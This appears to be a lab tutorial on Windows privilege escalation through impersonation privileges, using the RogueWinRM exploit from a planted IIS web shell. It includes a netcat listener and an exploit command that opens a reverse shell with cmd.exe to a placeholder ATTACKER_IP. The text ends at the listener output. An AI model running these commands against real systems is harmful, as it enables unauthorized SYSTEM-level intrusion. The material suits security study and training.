These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

Several reasons why using ftp's token is not the best idea: 
- For the files to be served correctly, they would need to be accessible to the `ftp` user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`. This adds complexity as we must manually configure specific permissions for each served file/directory. 
- For the operating system, all files are accessed by user `ftp`, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. 
- If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the `ftp` user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or *SeAssignPrimaryToken* privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user `ftp` in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with *SeImpersonate* or *SeAssignPrimaryToken* privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. *Internet Information Services (IIS)* will also create a similar default account called "*iis apppool\defaultapppool*" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 
1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use *RogueWinRM* exploit to accomplish both conditions. Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address: `http://10.10.141.18/`

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

 **What is WinRM?**
- **Windows Remote Management (WinRM)** is a Windows service that allows remote management of Windows machines using the WS-Management protocol.
- It is often used in environments where administrators need to manage multiple machines remotely, particularly through PowerShell remoting.
- By default, WinRM is not enabled on most Windows machines, but it is commonly used in enterprise environments.

#### Common Techniques Using RogueWinRM
 **Remote Code Execution (RCE)**:
    - Attackers can use WinRM to execute arbitrary commands on the target machine remotely. This is particularly dangerous if done with elevated privileges.
    
 **Reverse Shell**:
    - An attacker can use RogueWinRM to establish a reverse shell, providing continuous remote access to the target machine.

 **Credential Dumping**:
    - After gaining access, the attacker might dump credentials from the target machine, allowing them to move laterally within the network.

 **Pivoting**:
    - RogueWinRM can be used to pivot to other machines within the network, making it a powerful tool in a larger attack campaign.


To use *RogueWinRM*, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the `C:\tools\` folder.

The *RogueWinRM* exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
```shell-session
user@attackerpc$ nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:
```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

*Note:* 
	The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

- The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. 
- The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
```shell-session
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
